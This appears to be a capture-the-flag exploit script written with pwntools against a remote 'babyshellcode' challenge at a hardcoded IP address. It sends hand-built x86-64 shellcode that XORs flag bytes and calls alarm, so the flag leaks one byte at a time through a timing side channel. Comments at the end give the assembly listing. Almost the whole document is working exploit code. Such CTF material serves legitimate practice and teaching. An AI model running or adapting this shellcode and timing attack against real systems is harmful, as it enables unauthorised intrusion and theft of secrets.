import time
from pwn import *

flag = 'ISITDTU{'
for offset in range(0x8, 0x30):
	for diff in range(0x1c, 0x80, 0x2):
		# r = process('./babyshellcode_patched', env={'LD_LIBRARY_PATH': '.'})
		r = remote('209.97.162.170', 2222)

		before = time.time()

		payload = ''
		payload += '\x40\x8a\x3c\x25{:c}\xe0\xaf\x0c'.format(offset % 8)
		payload += '\x40\x32\x3c\x25{:c}\xe0\xaf\x0c'.format(offset)
		payload += '\x83\xf7{:c}'.format(ord(flag[offset % 8]))
		payload += '\x83\xef{:c}'.format(diff)
		payload += '\xb0\x25\x0f\x05\xeb\xfe'
		r.sendline(payload)

		r.recvall()

		after = time.time()

		elapsed = int(after - before)
		if elapsed <= 2:
			flag += chr(diff + elapsed)
			print(flag)
			break

# mov (0xcafe000),%dil
# xor (0xcafe000),%dil
# xor $0x00,%edi
# sub $0x00,%edi
# mov $0x25,%al
# syscall
# loop:
# jmp loop
#    1 0000 408A3C25 	mov (0xcafe000),%dil
#    1      00E0AF0C
#    2 0008 40323C25 	xor (0xcafe000),%dil
#    2      00E0AF0C
#    3 0010 83F700   	xor $0x00,%edi
#    4 0013 83EF00   	sub $0x00,%edi
#    5 0016 B025     	mov $0x25,%al
#    6 0018 0F05     	syscall
#    7              	loop:
#    8 001a EBFE     	jmp loop
